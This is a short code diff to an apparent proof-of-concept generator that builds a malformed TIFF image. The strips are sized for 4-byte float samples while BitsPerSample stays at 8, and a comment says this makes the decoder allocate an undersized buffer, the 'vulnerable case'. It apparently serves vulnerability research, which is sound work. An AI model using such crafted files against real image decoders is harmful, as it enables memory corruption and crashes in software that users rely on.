@@ -15,8 +15,9 @@ def build_poc():
     bps = 8
     num_strips = (height + rows_per_strip - 1) // rows_per_strip
 
-    # Each strip will contain this many uncompressed bytes
-    packed_size_per_strip = width * rows_per_strip * spp * bps // 8
+    # Each strip will contain float data (4 bytes per sample) when decompressed
+    # Keep BitsPerSample at 8 so the decoder allocates a smaller buffer (vulnerable case).
+    packed_size_per_strip = width * rows_per_strip * spp * 4
     zlib_payload = zlib.compress(b'A' * packed_size_per_strip, level=9)
 
     # Build IFD entries. Use offsets (0) for arrays we will fill after computing layout.
